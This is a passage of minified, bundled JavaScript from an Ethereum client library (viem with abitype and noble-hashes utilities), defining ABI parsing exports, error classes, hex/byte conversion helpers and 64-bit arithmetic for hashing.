c=(0,r.splitParameters)(o),l=c.length;for(let f=0;f<l;f++)a.push((0,i.parseAbiParameter)(c[f],{modifiers:e.modifiers}))}else{const c=(0,n.parseStructs)(o),l=o.length;for(let f=0;f<l;f++){const h=o[f];if((0,e.isStructSignature)(h))continue;const m=(0,r.splitParameters)(h),b=m.length;for(let w=0;w<b;w++)a.push((0,i.parseAbiParameter)(m[w],{modifiers:e.modifiers,structs:c}))}}if(a.length===0)throw new t.InvalidAbiParametersError({params:o});return a}return A6}var JK;function n0(){return JK||(JK=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.CircularReferenceError=t.InvalidParenthesisError=t.UnknownSignatureError=t.InvalidSignatureError=t.InvalidStructSignatureError=t.InvalidAbiParameterError=t.InvalidAbiParametersError=t.InvalidParameterError=t.SolidityProtectedKeywordError=t.InvalidModifierError=t.InvalidFunctionModifierError=t.InvalidAbiTypeParameterError=t.UnknownSolidityTypeError=t.InvalidAbiItemError=t.UnknownTypeError=t.parseAbiParameters=t.parseAbiParameter=t.parseAbiItem=t.parseAbi=t.formatAbiParameters=t.formatAbiParameter=t.formatAbiItem=t.formatAbi=t.narrow=t.BaseError=void 0;var e=mw();Object.defineProperty(t,"BaseError",{enumerable:!0,get:function(){return e.BaseError}});var n=SFe();Object.defineProperty(t,"narrow",{enumerable:!0,get:function(){return n.narrow}});var r=TFe();Object.defineProperty(t,"formatAbi",{enumerable:!0,get:function(){return r.formatAbi}});var i=rle();Object.defineProperty(t,"formatAbiItem",{enumerable:!0,get:function(){return i.formatAbiItem}});var s=tle();Object.defineProperty(t,"formatAbiParameter",{enumerable:!0,get:function(){return s.formatAbiParameter}});var o=nle();Object.defineProperty(t,"formatAbiParameters",{enumerable:!0,get:function(){return o.formatAbiParameters}});var a=IFe();Object.defineProperty(t,"parseAbi",{enumerable:!0,get:function(){return a.parseAbi}});var c=RFe();Object.defineProperty(t,"parseAbiItem",{enumerable:!0,get:function(){return c.parseAbiItem}});var l=PFe();Object.defineProperty(t,"parseAbiParameter",{enumerable:!0,get:function(){return l.parseAbiParameter}});var f=NFe();Object.defineProperty(t,"parseAbiParameters",{enumerable:!0,get:function(){return f.parseAbiParameters}});var h=B8();Object.defineProperty(t,"UnknownTypeError",{enumerable:!0,get:function(){return h.UnknownTypeError}}),Object.defineProperty(t,"InvalidAbiItemError",{enumerable:!0,get:function(){return h.InvalidAbiItemError}}),Object.defineProperty(t,"UnknownSolidityTypeError",{enumerable:!0,get:function(){return h.UnknownSolidityTypeError}});var m=kA();Object.defineProperty(t,"InvalidAbiTypeParameterError",{enumerable:!0,get:function(){return m.InvalidAbiTypeParameterError}}),Object.defineProperty(t,"InvalidFunctionModifierError",{enumerable:!0,get:function(){return m.InvalidFunctionModifierError}}),Object.defineProperty(t,"InvalidModifierError",{enumerable:!0,get:function(){return m.InvalidModifierError}}),Object.defineProperty(t,"SolidityProtectedKeywordError",{enumerable:!0,get:function(){return m.SolidityProtectedKeywordError}}),Object.defineProperty(t,"InvalidParameterError",{enumerable:!0,get:function(){return m.InvalidParameterError}}),Object.defineProperty(t,"InvalidAbiParametersError",{enumerable:!0,get:function(){return m.InvalidAbiParametersError}}),Object.defineProperty(t,"InvalidAbiParameterError",{enumerable:!0,get:function(){return m.InvalidAbiParameterError}});var b=jj();Object.defineProperty(t,"InvalidStructSignatureError",{enumerable:!0,get:function(){return b.InvalidStructSignatureError}}),Object.defineProperty(t,"InvalidSignatureError",{enumerable:!0,get:function(){return b.InvalidSignatureError}}),Object.defineProperty(t,"UnknownSignatureError",{enumerable:!0,get:function(){return b.UnknownSignatureError}});var w=sle();Object.defineProperty(t,"InvalidParenthesisError",{enumerable:!0,get:function(){return w.InvalidParenthesisError}});var y=ile();Object.defineProperty(t,"CircularReferenceError",{enumerable:!0,get:function(){return y.CircularReferenceError}})})(qO)),qO}var mb={},C6={},XK;function Pn(){if(XK)return C6;XK=1,Object.defineProperty(C6,"__esModule",{value:!0}),C6.getAction=t;function t(e,n,r){const i=e[n.name];if(typeof i=="function")return i;const s=e[r];return typeof s=="function"?s:o=>n(e,o)}return C6}var S6={},T6={},Rt={},n2={},eZ;function Zf(){if(eZ)return n2;eZ=1,Object.defineProperty(n2,"__esModule",{value:!0}),n2.formatAbiItem=e,n2.formatAbiParams=n;const t=$r();function e(i,{includeName:s=!1}={}){if(i.type!=="function"&&i.type!=="event"&&i.type!=="error")throw new t.InvalidDefinitionTypeError(i.type);return`${i.name}(${n(i.inputs,{includeName:s})})`}function n(i,{includeName:s=!1}={}){return i?i.map(o=>r(o,{includeName:s})).join(s?", ":","):""}function r(i,{includeName:s}){return i.type.startsWith("tuple")?`(${n(i.components,{includeName:s})})${i.type.slice(5)}`:i.type+(s&&i.name?` ${i.name}`:"")}return n2}var x6={},I6={},tZ;function So(){if(tZ)return I6;tZ=1,Object.defineProperty(I6,"__esModule",{value:!0}),I6.isHex=t;function t(e,{strict:n=!0}={}){return!e||typeof e!="string"?!1:n?/^0x[0-9a-fA-F]*$/.test(e):e.startsWith("0x")}return I6}var nZ;function fa(){if(nZ)return x6;nZ=1,Object.defineProperty(x6,"__esModule",{value:!0}),x6.size=e;const t=So();function e(n){return(0,t.isHex)(n,{strict:!1})?Math.ceil((n.length-2)/2):n.length}return x6}var gb={},r2={},rZ;function OFe(){return rZ||(rZ=1,Object.defineProperty(r2,"__esModule",{value:!0}),r2.version=void 0,r2.version="2.41.2"),r2}var iZ;function Kt(){if(iZ)return gb;iZ=1,Object.defineProperty(gb,"__esModule",{value:!0}),gb.BaseError=void 0,gb.setErrorConfig=n;const t=OFe();let e={getDocsUrl:({docsBaseUrl:s,docsPath:o="",docsSlug:a})=>o?`${s??"https://viem.sh"}${o}${a?`#${a}`:""}`:void 0,version:`viem@${t.version}`};function n(s){e=s}class r extends Error{constructor(o,a={}){const c=a.cause instanceof r?a.cause.details:a.cause?.message?a.cause.message:a.details,l=a.cause instanceof r&&a.cause.docsPath||a.docsPath,f=e.getDocsUrl?.({...a,docsPath:l}),h=[o||"An error occurred.","",...a.metaMessages?[...a.metaMessages,""]:[],...f?[`Docs: ${f}`]:[],...c?[`Details: ${c}`]:[],...e.version?[`Version: ${e.version}`]:[]].join(`
`);super(h,a.cause?{cause:a.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=c,this.docsPath=l,this.metaMessages=a.metaMessages,this.name=a.name??this.name,this.shortMessage=o,this.version=t.version}walk(o){return i(this,o)}}gb.BaseError=r;function i(s,o){return o?.(s)?s:s&&typeof s=="object"&&"cause"in s&&s.cause!==void 0?i(s.cause,o):o?null:s}return gb}var sZ;function $r(){if(sZ)return Rt;sZ=1,Object.defineProperty(Rt,"__esModule",{value:!0}),Rt.UnsupportedPackedAbiType=Rt.InvalidDefinitionTypeError=Rt.InvalidArrayError=Rt.InvalidAbiDecodingTypeError=Rt.InvalidAbiEncodingTypeError=Rt.DecodeLogTopicsMismatch=Rt.DecodeLogDataMismatch=Rt.BytesSizeMismatchError=Rt.AbiItemAmbiguityError=Rt.AbiFunctionSignatureNotFoundError=Rt.AbiFunctionOutputsNotFoundError=Rt.AbiFunctionNotFoundError=Rt.AbiEventNotFoundError=Rt.AbiEventSignatureNotFoundError=Rt.AbiEventSignatureEmptyTopicsError=Rt.AbiErrorSignatureNotFoundError=Rt.AbiErrorNotFoundError=Rt.AbiErrorInputsNotFoundError=Rt.AbiEncodingLengthMismatchError=Rt.AbiEncodingBytesSizeMismatchError=Rt.AbiEncodingArrayLengthMismatchError=Rt.AbiDecodingZeroDataError=Rt.AbiDecodingDataSizeTooSmallError=Rt.AbiDecodingDataSizeInvalidError=Rt.AbiConstructorParamsNotFoundError=Rt.AbiConstructorNotFoundError=void 0;const t=Zf(),e=fa(),n=Kt();class r extends n.BaseError{constructor({docsPath:q}){super(["A constructor was not found on the ABI.","Make sure you are using the correct ABI and that the constructor exists on it."].join(`
`),{docsPath:q,name:"AbiConstructorNotFoundError"})}}Rt.AbiConstructorNotFoundError=r;class i extends n.BaseError{constructor({docsPath:q}){super(["Constructor arguments were provided (`args`), but a constructor parameters (`inputs`) were not found on the ABI.","Make sure you are using the correct ABI, and that the `inputs` attribute on the constructor exists."].join(`
`),{docsPath:q,name:"AbiConstructorParamsNotFoundError"})}}Rt.AbiConstructorParamsNotFoundError=i;class s extends n.BaseError{constructor({data:q,size:P}){super([`Data size of ${P} bytes is invalid.`,"Size must be in increments of 32 bytes (size % 32 === 0)."].join(`
`),{metaMessages:[`Data: ${q} (${P} bytes)`],name:"AbiDecodingDataSizeInvalidError"})}}Rt.AbiDecodingDataSizeInvalidError=s;class o extends n.BaseError{constructor({data:q,params:P,size:C}){super([`Data size of ${C} bytes is too small for given parameters.`].join(`
`),{metaMessages:[`Params: (${(0,t.formatAbiParams)(P,{includeName:!0})})`,`Data:   ${q} (${C} bytes)`],name:"AbiDecodingDataSizeTooSmallError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=q,this.params=P,this.size=C}}Rt.AbiDecodingDataSizeTooSmallError=o;class a extends n.BaseError{constructor(){super('Cannot decode zero data ("0x") with ABI parameters.',{name:"AbiDecodingZeroDataError"})}}Rt.AbiDecodingZeroDataError=a;class c extends n.BaseError{constructor({expectedLength:q,givenLength:P,type:C}){super([`ABI encoding array length mismatch for type ${C}.`,`Expected length: ${q}`,`Given length: ${P}`].join(`
`),{name:"AbiEncodingArrayLengthMismatchError"})}}Rt.AbiEncodingArrayLengthMismatchError=c;class l extends n.BaseError{constructor({expectedSize:q,value:P}){super(`Size of bytes "${P}" (bytes${(0,e.size)(P)}) does not match expected size (bytes${q}).`,{name:"AbiEncodingBytesSizeMismatchError"})}}Rt.AbiEncodingBytesSizeMismatchError=l;class f extends n.BaseError{constructor({expectedLength:q,givenLength:P}){super(["ABI encoding params/values length mismatch.",`Expected length (params): ${q}`,`Given length (values): ${P}`].join(`
`),{name:"AbiEncodingLengthMismatchError"})}}Rt.AbiEncodingLengthMismatchError=f;class h extends n.BaseError{constructor(q,{docsPath:P}){super([`Arguments (\`args\`) were provided to "${q}", but "${q}" on the ABI does not contain any parameters (\`inputs\`).`,"Cannot encode error result without knowing what the parameter types are.","Make sure you are using the correct ABI and that the inputs exist on it."].join(`
`),{docsPath:P,name:"AbiErrorInputsNotFoundError"})}}Rt.AbiErrorInputsNotFoundError=h;class m extends n.BaseError{constructor(q,{docsPath:P}={}){super([`Error ${q?`"${q}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the error exists on it."].join(`
`),{docsPath:P,name:"AbiErrorNotFoundError"})}}Rt.AbiErrorNotFoundError=m;class b extends n.BaseError{constructor(q,{docsPath:P}){super([`Encoded error signature "${q}" not found on ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${q}.`].join(`
`),{docsPath:P,name:"AbiErrorSignatureNotFoundError"}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.signature=q}}Rt.AbiErrorSignatureNotFoundError=b;class w extends n.BaseError{constructor({docsPath:q}){super("Cannot extract event signature from empty topics.",{docsPath:q,name:"AbiEventSignatureEmptyTopicsError"})}}Rt.AbiEventSignatureEmptyTopicsError=w;class y extends n.BaseError{constructor(q,{docsPath:P}){super([`Encoded event signature "${q}" not found on ABI.`,"Make sure you are using the correct ABI and that the event exists on it.",`You can look up the signature here: https://openchain.xyz/signatures?query=${q}.`].join(`
`),{docsPath:P,name:"AbiEventSignatureNotFoundError"})}}Rt.AbiEventSignatureNotFoundError=y;class E extends n.BaseError{constructor(q,{docsPath:P}={}){super([`Event ${q?`"${q}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the event exists on it."].join(`
`),{docsPath:P,name:"AbiEventNotFoundError"})}}Rt.AbiEventNotFoundError=E;class A extends n.BaseError{constructor(q,{docsPath:P}={}){super([`Function ${q?`"${q}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:P,name:"AbiFunctionNotFoundError"})}}Rt.AbiFunctionNotFoundError=A;class R extends n.BaseError{constructor(q,{docsPath:P}){super([`Function "${q}" does not contain any \`outputs\` on ABI.`,"Cannot decode function result without knowing what the parameter types are.","Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:P,name:"AbiFunctionOutputsNotFoundError"})}}Rt.AbiFunctionOutputsNotFoundError=R;class S extends n.BaseError{constructor(q,{docsPath:P}){super([`Encoded function signature "${q}" not found on ABI.`,"Make sure you are using the correct ABI and that the function exists on it.",`You can look up the signature here: https://openchain.xyz/signatures?query=${q}.`].join(`
`),{docsPath:P,name:"AbiFunctionSignatureNotFoundError"})}}Rt.AbiFunctionSignatureNotFoundError=S;class v extends n.BaseError{constructor(q,P){super("Found ambiguous types in overloaded ABI items.",{metaMessages:[`\`${q.type}\` in \`${(0,t.formatAbiItem)(q.abiItem)}\`, and`,`\`${P.type}\` in \`${(0,t.formatAbiItem)(P.abiItem)}\``,"","These types encode differently and cannot be distinguished at runtime.","Remove one of the ambiguous items in the ABI."],name:"AbiItemAmbiguityError"})}}Rt.AbiItemAmbiguityError=v;class k extends n.BaseError{constructor({expectedSize:q,givenSize:P}){super(`Expected bytes${q}, got bytes${P}.`,{name:"BytesSizeMismatchError"})}}Rt.BytesSizeMismatchError=k;class O extends n.BaseError{constructor({abiItem:q,data:P,params:C,size:j}){super([`Data size of ${j} bytes is too small for non-indexed event parameters.`].join(`
`),{metaMessages:[`Params: (${(0,t.formatAbiParams)(C,{includeName:!0})})`,`Data:   ${P} (${j} bytes)`],name:"DecodeLogDataMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=q,this.data=P,this.params=C,this.size=j}}Rt.DecodeLogDataMismatch=O;class _ extends n.BaseError{constructor({abiItem:q,param:P}){super([`Expected a topic for indexed event parameter${P.name?` "${P.name}"`:""} on event "${(0,t.formatAbiItem)(q,{includeName:!0})}".`].join(`
`),{name:"DecodeLogTopicsMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=q}}Rt.DecodeLogTopicsMismatch=_;class I extends n.BaseError{constructor(q,{docsPath:P}){super([`Type "${q}" is not a valid encoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:P,name:"InvalidAbiEncodingType"})}}Rt.InvalidAbiEncodingTypeError=I;class T extends n.BaseError{constructor(q,{docsPath:P}){super([`Type "${q}" is not a valid decoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:P,name:"InvalidAbiDecodingType"})}}Rt.InvalidAbiDecodingTypeError=T;class B extends n.BaseError{constructor(q){super([`Value "${q}" is not a valid array.`].join(`
`),{name:"InvalidArrayError"})}}Rt.InvalidArrayError=B;class U extends n.BaseError{constructor(q){super([`"${q}" is not a valid definition type.`,'Valid types: "function", "event", "error"'].join(`
`),{name:"InvalidDefinitionTypeError"})}}Rt.InvalidDefinitionTypeError=U;class M extends n.BaseError{constructor(q){super(`Type "${q}" is not supported for packed encoding.`,{name:"UnsupportedPackedAbiType"})}}return Rt.UnsupportedPackedAbiType=M,Rt}var i2={},oZ;function ole(){if(oZ)return i2;oZ=1,Object.defineProperty(i2,"__esModule",{value:!0}),i2.FilterTypeNotSupportedError=void 0;const t=Kt();class e extends t.BaseError{constructor(r){super(`Filter type "${r}" is not supported.`,{name:"FilterTypeNotSupportedError"})}}return i2.FilterTypeNotSupportedError=e,i2}var Xh={},yb={},Kd={},aZ;function M8(){if(aZ)return Kd;aZ=1,Object.defineProperty(Kd,"__esModule",{value:!0}),Kd.InvalidBytesLengthError=Kd.SizeExceedsPaddingSizeError=Kd.SliceOffsetOutOfBoundsError=void 0;const t=Kt();class e extends t.BaseError{constructor({offset:s,position:o,size:a}){super(`Slice ${o==="start"?"starting":"ending"} at offset "${s}" is out-of-bounds (size: ${a}).`,{name:"SliceOffsetOutOfBoundsError"})}}Kd.SliceOffsetOutOfBoundsError=e;class n extends t.BaseError{constructor({size:s,targetSize:o,type:a}){super(`${a.charAt(0).toUpperCase()}${a.slice(1).toLowerCase()} size (${s}) exceeds padding size (${o}).`,{name:"SizeExceedsPaddingSizeError"})}}Kd.SizeExceedsPaddingSizeError=n;class r extends t.BaseError{constructor({size:s,targetSize:o,type:a}){super(`${a.charAt(0).toUpperCase()}${a.slice(1).toLowerCase()} is expected to be ${o} ${a} long, but is ${s} ${a} long.`,{name:"InvalidBytesLengthError"})}}return Kd.InvalidBytesLengthError=r,Kd}var cZ;function r0(){if(cZ)return yb;cZ=1,Object.defineProperty(yb,"__esModule",{value:!0}),yb.pad=e,yb.padHex=n,yb.padBytes=r;const t=M8();function e(i,{dir:s,size:o=32}={}){return typeof i=="string"?n(i,{dir:s,size:o}):r(i,{dir:s,size:o})}function n(i,{dir:s,size:o=32}={}){if(o===null)return i;const a=i.replace("0x","");if(a.length>o*2)throw new t.SizeExceedsPaddingSizeError({size:Math.ceil(a.length/2),targetSize:o,type:"hex"});return`0x${a[s==="right"?"padEnd":"padStart"](o*2,"0")}`}function r(i,{dir:s,size:o=32}={}){if(o===null)return i;if(i.length>o)throw new t.SizeExceedsPaddingSizeError({size:i.length,targetSize:o,type:"bytes"});const a=new Uint8Array(o);for(let c=0;c<o;c++){const l=s==="right";a[l?c:o-c-1]=i[l?c:i.length-c-1]}return a}return yb}var Zd={},Da={},uZ;function yw(){if(uZ)return Da;uZ=1,Object.defineProperty(Da,"__esModule",{value:!0}),Da.SizeOverflowError=Da.InvalidHexValueError=Da.InvalidHexBooleanError=Da.InvalidBytesBooleanError=Da.IntegerOutOfRangeError=void 0;const t=Kt();class e extends t.BaseError{constructor({max:a,min:c,signed:l,size:f,value:h}){super(`Number "${h}" is not in safe ${f?`${f*8}-bit ${l?"signed":"unsigned"} `:""}integer range ${a?`(${c} to ${a})`:`(above ${c})`}`,{name:"IntegerOutOfRangeError"})}}Da.IntegerOutOfRangeError=e;class n extends t.BaseError{constructor(a){super(`Bytes value "${a}" is not a valid boolean. The bytes array must contain a single byte of either a 0 or 1 value.`,{name:"InvalidBytesBooleanError"})}}Da.InvalidBytesBooleanError=n;class r extends t.BaseError{constructor(a){super(`Hex value "${a}" is not a valid boolean. The hex value must be "0x0" (false) or "0x1" (true).`,{name:"InvalidHexBooleanError"})}}Da.InvalidHexBooleanError=r;class i extends t.BaseError{constructor(a){super(`Hex value "${a}" is an odd length (${a.length}). It must be an even length.`,{name:"InvalidHexValueError"})}}Da.InvalidHexValueError=i;class s extends t.BaseError{constructor({givenSize:a,maxSize:c}){super(`Size cannot exceed ${c} bytes. Given size: ${a} bytes.`,{name:"SizeOverflowError"})}}return Da.SizeOverflowError=s,Da}var R6={},lZ;function Yf(){if(lZ)return R6;lZ=1,Object.defineProperty(R6,"__esModule",{value:!0}),R6.trim=t;function t(e,{dir:n="left"}={}){let r=typeof e=="string"?e.replace("0x",""):e,i=0;for(let s=0;s<r.length-1&&r[n==="left"?s:r.length-s-1].toString()==="0";s++)i++;return r=n==="left"?r.slice(i):r.slice(0,r.length-i),typeof e=="string"?(r.length===1&&n==="right"&&(r=`${r}0`),`0x${r.length%2===1?`0${r}`:r}`):r}return R6}var dZ;function ci(){if(dZ)return Zd;dZ=1,Object.defineProperty(Zd,"__esModule",{value:!0}),Zd.assertSize=i,Zd.fromHex=s,Zd.hexToBigInt=o,Zd.hexToBool=a,Zd.hexToNumber=c,Zd.hexToString=l;const t=yw(),e=fa(),n=Yf(),r=yr();function i(f,{size:h}){if((0,e.size)(f)>h)throw new t.SizeOverflowError({givenSize:(0,e.size)(f),maxSize:h})}function s(f,h){const m=typeof h=="string"?{to:h}:h,b=m.to;return b==="number"?c(f,m):b==="bigint"?o(f,m):b==="string"?l(f,m):b==="boolean"?a(f,m):(0,r.hexToBytes)(f,m)}function o(f,h={}){const{signed:m}=h;h.size&&i(f,{size:h.size});const b=BigInt(f);if(!m)return b;const w=(f.length-2)/2,y=(1n<<BigInt(w)*8n-1n)-1n;return b<=y?b:b-BigInt(`0x${"f".padStart(w*2,"f")}`)-1n}function a(f,h={}){let m=f;if(h.size&&(i(m,{size:h.size}),m=(0,n.trim)(m)),(0,n.trim)(m)==="0x00")return!1;if((0,n.trim)(m)==="0x01")return!0;throw new t.InvalidHexBooleanError(m)}function c(f,h={}){return Number(o(f,h))}function l(f,h={}){let m=(0,r.hexToBytes)(f);return h.size&&(i(m,{size:h.size}),m=(0,n.trim)(m,{dir:"right"})),new TextDecoder().decode(m)}return Zd}var ep={},fZ;function lt(){if(fZ)return ep;fZ=1,Object.defineProperty(ep,"__esModule",{value:!0}),ep.toHex=i,ep.boolToHex=s,ep.bytesToHex=o,ep.numberToHex=a,ep.stringToHex=l;const t=yw(),e=r0(),n=ci(),r=Array.from({length:256},(f,h)=>h.toString(16).padStart(2,"0"));function i(f,h={}){return typeof f=="number"||typeof f=="bigint"?a(f,h):typeof f=="string"?l(f,h):typeof f=="boolean"?s(f,h):o(f,h)}function s(f,h={}){const m=`0x${Number(f)}`;return typeof h.size=="number"?((0,n.assertSize)(m,{size:h.size}),(0,e.pad)(m,{size:h.size})):m}function o(f,h={}){let m="";for(let w=0;w<f.length;w++)m+=r[f[w]];const b=`0x${m}`;return typeof h.size=="number"?((0,n.assertSize)(b,{size:h.size}),(0,e.pad)(b,{dir:"right",size:h.size})):b}function a(f,h={}){const{signed:m,size:b}=h,w=BigInt(f);let y;b?m?y=(1n<<BigInt(b)*8n-1n)-1n:y=2n**(BigInt(b)*8n)-1n:typeof f=="number"&&(y=BigInt(Number.MAX_SAFE_INTEGER));const E=typeof y=="bigint"&&m?-y-1n:0;if(y&&w>y||w<E){const R=typeof f=="bigint"?"n":"";throw new t.IntegerOutOfRangeError({max:y?`${y}${R}`:void 0,min:`${E}${R}`,signed:m,size:b,value:`${f}${R}`})}const A=`0x${(m&&w<0?(1n<<BigInt(b*8))+BigInt(w):w).toString(16)}`;return b?(0,e.pad)(A,{size:b}):A}const c=new TextEncoder;function l(f,h={}){const m=c.encode(f);return o(m,h)}return ep}var hZ;function yr(){if(hZ)return Xh;hZ=1,Object.defineProperty(Xh,"__esModule",{value:!0}),Xh.toBytes=o,Xh.boolToBytes=a,Xh.hexToBytes=f,Xh.numberToBytes=h,Xh.stringToBytes=m;const t=Kt(),e=So(),n=r0(),r=ci(),i=lt(),s=new TextEncoder;function o(b,w={}){return typeof b=="number"||typeof b=="bigint"?h(b,w):typeof b=="boolean"?a(b,w):(0,e.isHex)(b)?f(b,w):m(b,w)}function a(b,w={}){const y=new Uint8Array(1);return y[0]=Number(b),typeof w.size=="number"?((0,r.assertSize)(y,{size:w.size}),(0,n.pad)(y,{size:w.size})):y}const c={zero:48,nine:57,A:65,F:70,a:97,f:102};function l(b){if(b>=c.zero&&b<=c.nine)return b-c.zero;if(b>=c.A&&b<=c.F)return b-(c.A-10);if(b>=c.a&&b<=c.f)return b-(c.a-10)}function f(b,w={}){let y=b;w.size&&((0,r.assertSize)(y,{size:w.size}),y=(0,n.pad)(y,{dir:"right",size:w.size}));let E=y.slice(2);E.length%2&&(E=`0${E}`);const A=E.length/2,R=new Uint8Array(A);for(let S=0,v=0;S<A;S++){const k=l(E.charCodeAt(v++)),O=l(E.charCodeAt(v++));if(k===void 0||O===void 0)throw new t.BaseError(`Invalid byte sequence ("${E[v-2]}${E[v-1]}" in "${E}").`);R[S]=k*16+O}return R}function h(b,w){const y=(0,i.numberToHex)(b,w);return f(y)}function m(b,w={}){const y=s.encode(b);return typeof w.size=="number"?((0,r.assertSize)(y,{size:w.size}),(0,n.pad)(y,{dir:"right",size:w.size})):y}return Xh}var P6={},Er={},zt={},pZ;function ale(){if(pZ)return zt;pZ=1,Object.defineProperty(zt,"__esModule",{value:!0}),zt.toBig=zt.shrSL=zt.shrSH=zt.rotrSL=zt.rotrSH=zt.rotrBL=zt.rotrBH=zt.rotr32L=zt.rotr32H=zt.rotlSL=zt.rotlSH=zt.rotlBL=zt.rotlBH=zt.add5L=zt.add5H=zt.add4L=zt.add4H=zt.add3L=zt.add3H=void 0,zt.add=A,zt.fromBig=n,zt.split=r;const t=BigInt(2**32-1),e=BigInt(32);function n(T,B=!1){return B?{h:Number(T&t),l:Number(T>>e&t)}:{h:Number(T>>e&t)|0,l:Number(T&t)|0}}function r(T,B=!1){const U=T.length;let M=new Uint32Array(U),N=new Uint32Array(U);for(let q=0;q<U;q++){const{h:P,l:C}=n(T[q],B);[M[q],N[q]]=[P,C]}return[M,N]}const i=(T,B)=>BigInt(T>>>0)<<e|BigInt(B>>>0);zt.toBig=i;const s=(T,B,U)=>T>>>U;zt.shrSH=s;const o=(T,B,U)=>T<<32-U|B>>>U;zt.shrSL=o;const a=(T,B,U)=>T>>>U|B<<32-U;zt.rotrSH=a;const c=(T,B,U)=>T<<32-U|B>>>U;zt.rotrSL=c;const l=(T,B,U)=>T<<64-U|B>>>U-32;zt.rotrBH=l;const f=(T,B,U)=>T>>>U-32|B<<64-U;zt.rotrBL=f;const h=(T,B)=>B;zt.rotr32H=h;const m=(T,B)=>T;zt.rotr32L=m;const b=(T,B,U)=>T<<U|B>>>32-U;zt.rotlSH=b;const w=(T,B,U)=>B<<U|T>>>32-U;zt.rotlSL=w;const y=(T,B,U)=>B<<U-32|T>>>64-U;zt.rotlBH=y;const E=(T,B,U)=>T<<U-32|B>>>64-U;zt.rotlBL=E;function A(T,B,U,M){const N=(B>>>0)+(M>>>0);return{h:T+U+(N/2**32|0)|0,l:N|0}}const R=(T,B,U)=>(T>>>0)+(B>>>0)+(U>>>0);zt.add3L=R;const S=(T,B,U,M)=>B+U+M+(T/2**32|0)|0;zt.add3H=S;const v=(T,B,U,M)=>(T>>>0)+(B>>>0)+(U>>>0)+(M>>>0);zt.add4L=v;const k=(T,B,U,M,N)=>B+U+M+N+(T/2**32|0)|0;zt.add4H=k;const O=(T,B,U,M,N)=>(T>>>0)+(B>>>0)+(U>>>0)+(M>>>0)+(N>>>0);zt.add5L=O;const _=(T,B,U,M,N,q)=>B+U+M+N+q+(T/2**32|0)|0;zt.add5H=_;const I={fromBig:n,split:r,toBig:i,shrSH:s,shrSL:o,rotrSH:a,rotrSL:c,rotrBH:l,rotrBL:f,rotr32H:h,rotr32L:m,rotlSH:b,rotlSL:w,rotlBH:y,rotlBL:E,add:A,add3L:R,add3H:S,add4L:v,add4H:k,add5H:_,add5L:O};return zt.default=I,zt}var VO={},s2={},mZ;function kFe(){return mZ||(mZ=1,Object.defineProperty(s2,"__esModule",{value:!0}),s2.crypto=void 0,s2.crypto=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0),s2}var gZ;function i0(){return gZ||(gZ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.wrapXOFConstructorWithOpts=t.wrapConstructorWithOpts=t.wrapConstructor=t.Hash=t.nextTick=t.swap32IfBE=t.byteSwapIfBE=t.swap8IfBE=t.isLE=void 0,t.isBytes=n,t.anumber=r,t.abytes=i,t.ahash=s,t.aexists=o,t.aoutput=a,t.u8=c,t.u32=l,t.clean=f,t.createView=h,t.rotr=m,t.rotl=b,t.byteSwap=w,t.byteSwap32=y,t.bytesToHex=R,t.hexToBytes=k,t.asyncLoop=_,t.utf8ToBytes=I,t.bytesToUtf8=T,t.toBytes=B,t.kdfInputToBytes=U,t.concatBytes=M,t.checkOpts=N,t.createHasher=P,t.createOptHasher=C,t.createXOFer=j,t.randomBytes=z;const e=kFe();function n($){return $ instanceof Uint8Array||ArrayBuffer.isView($)&&$.constructor.name==="Uint8Array"}function r($){if(!Number.isSafeInteger($)||$<0)throw new Error("positive integer expected, got "+$)}function i($,...H){if(!n($))throw new Error("Uint8Array expected");if(H.length>0&&!H.includes($.length))throw new Error("Uint8Array expected of length "+H+", got length="+$.length)}function s($){if(typeof $!="function"||typeof $.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");r($.outputLen),r($.blockLen)}function o($,H=!0){if($.destroyed)throw new Error("Hash instance has been destroyed");if(H&&$.finished)throw new Error("Hash#digest() has already been called")}function a($,H){i($);const L=H.outputLen;if($.length<L)throw new Error("digestInto() expects output buffer of length at least "+L)}function c($){return new Uint8Array($.buffer,$.byteOffset,$.byteLength)}function l($){return new Uint32Array($.buffer,$.byteOffset,Math.floor($.byteLength/4))}function f(...$){for(let H=0;H<$.length;H++)$[H].fill(0)}function h($){return new DataView($.buffer,$.byteOffset,$.byteLength)}function m($,H){return $<<32-H|$>>>H}function b($,H){return $<<H|$>>>32-H>>>0}t.isLE=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function w($){return 